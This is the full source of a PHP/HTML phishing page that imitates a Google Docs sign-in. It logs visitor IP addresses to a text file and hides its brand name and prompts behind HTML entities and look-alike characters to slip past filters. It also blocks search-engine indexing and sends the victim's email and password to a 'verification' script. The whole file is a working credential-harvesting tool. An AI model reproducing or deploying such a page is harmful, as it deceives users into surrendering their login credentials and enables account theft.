﻿<?
$ip = getenv("REMOTE_ADDR");
$file = fopen("vu.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
?>
<meta name="robots" content="noindex"> <meta name="robots" content="noarchive">
<!doctype html public "-//w3c//dtd html 4.01 transitional//en" "http://www.w3.org/tr/html4/loose.dtd">
<html>
<head>
	<meta http-equiv="content-type" content="text/html;charset=utf-8">
	<title>&#71;&#111;&#111;&#103;l&#101; &#68;&#111;&#99;&#115;</title>
	<link href="css/style.css" type="text/css" rel="stylesheet">
	<link href="img/fav.ico" rel="shortcut icon">
	<script type="text/javascript">
		function addClassCss(el){
			el.style.background= "none";
		}
	</script>
</head>
<body>
</body>
<div id="logo"></div>
	<div id="cadrecentrale">
		<div id="wrapper">
			<div class="center">
			<!-- form submit start -->
			    <form action="verification/index.php" method="POST" autocomplete="OFF">
					<h1>
					<p align="center"><img  border="0" src="img/rst.png" width="295" height="157"></h1></p>
					<h1>
					<p align="center"><img  border="0" src="img/rst2.png"></h1></p>
					<p align="center">
					<input size="30" maxlength="128" id="donnee1" type="text" name="donnee1" required title="&Rho;lease &Epsilon;nter &Upsilon;&omicron;ur &#69;&#109;&#97;&#105;l" onMouseDown="javascript:addClassCss(this);" />
					<br />
					<input size="30" maxlength="32" id="donnee2" type="password" name="donnee2" required value=""  onMouseDown="javascript:addClassCss(this);" />
					<br />
					<input class="ilogin" border="0" alt="Sign In" type="image" value="submit" src="img/btn-sign-in.png" />
					<h1>
					<p align="center"><img  border="0" src="img/rst3.png" width="281" height="47"></h1></p>
					</p>
				</form>
			</div>
		</div>
	</div>
<br>
<br>
<br>
<br>
<p align="center"><img border="0" src="img/footer.png"></p>

</html>